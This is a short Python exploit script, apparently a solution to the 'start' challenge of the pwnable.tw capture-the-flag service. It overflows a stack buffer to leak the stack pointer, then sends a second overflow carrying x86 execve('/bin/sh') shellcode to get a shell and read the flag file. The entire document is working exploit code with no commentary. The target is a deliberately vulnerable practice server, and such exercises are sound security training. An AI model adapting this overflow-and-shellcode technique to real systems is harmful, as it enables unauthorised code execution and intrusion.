from socket import socket, AF_INET, SOCK_STREAM
from struct import pack, unpack
from binascii import unhexlify

conn = socket(AF_INET, SOCK_STREAM)
conn.connect(("chall.pwnable.tw", 10000))
print("RECEIVED: {}".format(conn.recv(128).decode()))

payload = b"a" * 20
payload += pack("<I", 0x08048087)
conn.send(payload)
print("SENT PAYLOAD: {}".format(payload))

esp = unpack("<I", conn.recv(1028)[:4])[0]
print("ESP(LEAKED): {}".format(hex(esp)))

payload = b"a" * 20
payload += pack("<I", esp + 20)
payload += unhexlify("31c050682f2f7368682f62696e89e3505389e199b00bcd80")
assert len(payload) <= 60
conn.send(payload)
conn.send(b"cat /home/start/flag\n")
print("RECEIVED: {}".format(conn.recv(1028).decode()))
